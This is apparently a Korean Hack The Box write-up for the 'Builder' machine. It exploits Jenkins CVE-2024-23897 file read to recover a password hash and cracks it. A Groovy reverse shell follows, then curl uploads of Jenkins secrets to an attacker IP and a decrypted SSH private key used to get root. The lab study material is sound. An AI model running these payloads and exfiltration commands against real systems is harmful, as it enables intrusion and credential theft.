# HTB-BUILDER
```bash
OS: Linux
DATE: 26.10.15
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 검사를 위해 전체 포트 스캔 및 상세 검사를 진행하였다
```bash
nmap -p- -T4 builder.htb | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 22,8080 builder.htb
```
```bash
sudo nmap -sUV --top-ports 100 builder.htb
```
그 결과 TCP 22, 8080(HTTP) 서비스가 운영 중인 것을 알게 되었다. 또한 상세 검사를 통해 Jetty 10.0.18과 그 안에 jenkins가 돌아가는 것 또한 알게 되었다. 따라서 더 쓸 만한 정보가 있는지 FUZZING을 진행하였다
```bash
ffuf -u http://builder.htb:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -c
```
```bash
ffuf -u http://builder.htb:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://builder.htb:8080 -H "Host: FUZZ.builder.htb" -fs 14900-15100
```
FUZZING 결과 기본 jenkins 디렉토리들이 몇 개 나오고, 숨겨진 디렉토리 등 쓸 만한 디렉토리는 찾지 못했다

## Initial Access
Fuzzing 후 서비스에 접근해본 결과 Jenkins 2.441이라는 버전을 알게 되었다. 따라서 관련 취약점이 있는지 검색해본 결과 **CVE-2024-23897**라는 LFI 취약점을 알게 되었다. 따라서 바로 [PoC](https://www.exploit-db.com/exploits/51993)를 가지고 실행해보았다
```bash
python3 51993.py -u http://builder.htb:8080

Press Ctrl+C to exit
File to download:
> /etc/passwd
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
File to download:
```
따라서 다른 Jenkins 파일을 읽는 것을 시도하였지만 모두 불가능하였다. 따라서 기법이 잘못되었다고 생각하여 다른 PoC를 찾아보았다. 그 결과 cli를 통해 내부 파일을 읽을 수 있다는 것을 알게 되었다. 먼저 방법은 wget을 이용하여 `jenkins-cli.jar`을 다운로드 받아준 후 파일을 읽어주는 방법이었다
```bash
wget http://builder.htb:8080/jnlpJars/jenkins-cli.jar
```
```bash
java -jar jenkins-cli.jar -s http://builder.htb:8080/ -http connect-node "@/etc/passwd"

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.
```
그 결과 다시 한 번 exploit을 성공하였다. 이제 LFI가 확실하게 확인되었으니 내부 중요 파일을 읽거나 RCE를 노리는 공격을 해야 했다. 따라서 먼저 /etc/passwd 파일을 통해 Jenkins 기본 디렉토리를 읽어주었다. 이후 이 파일 이후로 어떤 중요한 디렉토리가 있는지 searching하였다. 그 결과 [Administering Jenkins](https://wiki.jenkins-ci.org/JENKINS/Administering-Jenkins.html)로 config.xml 위치 등등을 알 수 있었다. 따라서 config.xml 등등 모든 파일을 출력해보았지만 아무런 쓸 만한 정보를 얻지는 못하였다
```bash
java -jar jenkins-cli.jar -s http://builder.htb:8080/ -http connect-node "@/var/jenkins_home/config.xml"
```
따라서 대상 버전을 도커로 다운로드받아 실제로 진입 후 뭐가 다른지 확인해보았다
```bash
docker run -d --name jenkins-lab -p 8081:8080 jenkins/jenkins:2.441
```
```bash
docker exec -it jenkins-lab bash
```
```bash
cd /var/jenkins_home
```
접속하여 확인해본 결과 일반적인 dir과 달리 users라는 폴더가 있었다. 안의 내용을 살펴보니 users.xml이라는, 유저 목록 및 어떤 유저가 어떤 폴더에 들어가 있는지 알 수 있는 파일과 username_number 폴더들이 있었다. 그 안에는 config.xml이라는, bcrypt로 해시된 비밀번호가 있는 파일이 있었다. 따라서 구조가 users 안에 있는 users.xml을 읽은 후 그 유저의 config까지 읽는 것을 목표로, 다시 한 번 더 취약점을 이용해보았다
```bash
java -jar jenkins-cli.jar -s http://builder.htb:8080/ -http connect-node "@/var/jenkins_home/users/users.xml"

<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
      <string>jennifer_12108429903186576833</string>: No such agent "      <string>jennifer_12108429903186576833</string>" exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such agent "  <idToDirectoryNameMap class="concurrent-hash-map">" exists.
    <entry>: No such agent "    <entry>" exists.
      <string>jennifer</string>: No such agent "      <string>jennifer</string>" exists.
  <version>1</version>: No such agent "  <version>1</version>" exists.
</hudson.model.UserIdMapper>: No such agent "</hudson.model.UserIdMapper>" exists.
  </idToDirectoryNameMap>: No such agent "  </idToDirectoryNameMap>" exists.
<hudson.model.UserIdMapper>: No such agent "<hudson.model.UserIdMapper>" exists.
    </entry>: No such agent "    </entry>" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
```
그 결과 jennifer 유저의 폴더 경로를 알 수 있었고, 그 폴더 안에 있는 config.xml 파일을 읽어보았다
```bash
java -jar jenkins-cli.jar -s http://builder.htb:8080/ -http connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"

<io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>: No such agent "    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>" exists.
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such agent "      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>" exists.
```
그 결과 jennifer 유저의 해시를 얻게 되었다. 따라서 hash를 파일에 저장해주고 hashcat을 돌려보았다
```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```
그 결과 jennifer라는 유저의 평문 비밀번호를 얻게 되었고, 대상 크레덴셜로 웹에 로그인한 결과 Jenkins admin 권한으로 로그인을 성공하였다. 따라서 jenkins console을 사용하여 쉘을 받아주었다
```groovy
String host="IP";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
대상 포트를 켜주고 리버스 쉘을 돌린 결과 유저 쉘을 얻을 수 있게 되었다
```bash
rlwrap nc -nlvp 4444
```

![user](attach_real/Pasted%20image%2020261020180437.png)

## Privilege Escalation
유저 쉘을 얻고 여기저기 뒤져본 결과 jenkins 안에 credentials.xml이라는 파일이 있어서 구글에 검색해본 결과 jenkins console로 decrypt가 가능하다는 것을 알게 되었다. 따라서 [decrypt.py](https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py)라는 도구를 사용하여 decrypt를 진행하였다. 일단 먼저 필요한 것이 `master.key, hudson.util.Secret, credentials.xml`이기 때문에 대상 쉘에서 로컬로 옮겨줘야 한다. 하지만 대상 쉘에는 python 같은 도구가 없기에, 내 서버를 열어주고 쉘에서 보내주는 형태인 `uploadserver`라는 도구를 사용해주었다
```bash
uploadserver 8000
```
이후 쉘 안에서 curl -F 기능을 사용하여 파일들을 보내주었다
```bash
curl -F 'files=@/var/jenkins_home/secrets/hudson.util.Secret' http://IP:8000/upload
```
```bash
curl -F 'files=@/var/jenkins_home/secrets/master.key' http://10.10.14.23:8000/upload
```
```bash
curl -F 'files=@/var/jenkins_home/credentials.xml' http://10.10.14.23:8000/upload
```
이후 decrypt.py를 사용하여 복호화해주었다
```bash
python3 decrypt.py master.key hudson.util.Secret credentials.xml

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt3G9oUyouXj/0CLya9Wz7Vs31bC4rdvgv7n9PCwrApm8PmGCSLgv
Up2m70MKGF5e+s1KZZw7gQbVHRI0U+2t/u8A5dJJsU9DVf9w54N08IjvPK/cgFEYcyRXWA
EYz0+41fcDjGyzO9dlNlJ/w2NRP2xFg4+vYxX+tpq6G5Fnhhd5mCwUyAu7VKw4cVS36CNx
vqAC/KwFA8y0/s24T1U/sTj2xTaO3wlIrdQGPhfY0wsuYIVV3gHGPyY8bZ2HDdES5vDRpo
Fzwi85aNunCzvSQrnzpdrelqgFJc3UPV8s4yaL9JO3+s+akLr5YvPhIWMAmTbfeT3BwgMD
vUzyyF8wzh9Ee1J/6WyZbJzlP/Cdux9ilD88piwR2PulQXfPj6omT059uHGB4Lbp0AxRXo
L0gkxGXkcXYgVYgQlTNZsK8DhuAr0zaALkFo2vDPcCC1sc+FYTO1g2SOP4shZEkxMR1To5
yj/fRqtKvoMxdEokIVeQesj1YGvQqGCXNIchhfRNAAAFiNdpesPXaXrDAAAAB3NzaC1yc2
EAAAGBALdxvaFMqLl4/9Ai8mvVs+1bN9WwuK3b4L+5/TwsKwKZvD5hgki4L1Kdpu9DChhe
XvrNSmWcO4EG1R0SNFPtrf7vAOXSSbFPQ1X/cOeDdPCI7zyv3IBRGHMkV1gBGM9PuNX3A4
xsszvXZTZSf8NjUT9sRYOPr2MV/raauhuRZ4YXeZgsFMgLu1SsOHFUt+gjcb6gAvysBQPM
tP7NuE9VP7E49sU2jt8JSK3UBj4X2NMLLmCFVd4Bxj8mPG2dhw3REubw0aaBc8IvOWjbpw
s70kK586Xa3paoBSXN1D1fLOMmi/STt/rPmpC6+WLz4SFjAJk233k9wcIDA71M8shfM
```
그 결과 ssh private key로 보이는 파일을 얻을 수 있어, 그것을 id_rsa라는 파일로 저장해준 후 권한 부여 후 root로 접근해보았다
```bash
chmod 600 id_rsa
```
```bash
ssh -i id_rsa root@builder.htb
```
그 결과 root 접근을 성공하였다

![root](attach_real/Pasted%20image%2020261020181644.png)


## New Inform
- 공격이 안 된다고 생각해도 먼저 취약점을 자세히 읽자
- 항상 PoC를 먼저 찾는 것이 아니라 취약점의 전제조건을 읽고 실행해야 한다. 순서: CVE 찾음 → 공식 advisory + 설명글 읽음 → 그다음 PoC
- 먼저 서비스 내부 파일을 들여다보고 싶으면 서비스 기본 홈 디렉토리를 찾자. Ex) /etc/passwd
- 구글에 검색할 때 내부 파일을 `jenkins home directory structure` 이런 형식으로 검색하자
- 문서에 안 나오면 → 다른 맥락으로 재검색 or 로컬 설치로 실물 확인
- 만약 폴더가 정말 나오지 않는다면 대상 서비스 버전으로 도커를 실행 후 확인해본다
- 이후 서비스를 확실하게 뒤지고, 기본 structure에 나오지 않은 것들을 꼼꼼히 분석해본다
- 윈도우 cmd.exe가 리눅스에서는 /bin/bash
- 흔히 사용하는 python3 -m http.server가 불가능하면 uploadserver라는 도구를 사용하자
- 대상 쉘에서는 curl -F, 즉 form으로 보내라는 옵션을 사용해주고, 'files=@경로'라는 파일 경로를 세팅해주고, 내 IP 주소 그리고 열어둔 포트 번호를 입력해준 후 꼭 /upload라는 경로를 입력해주자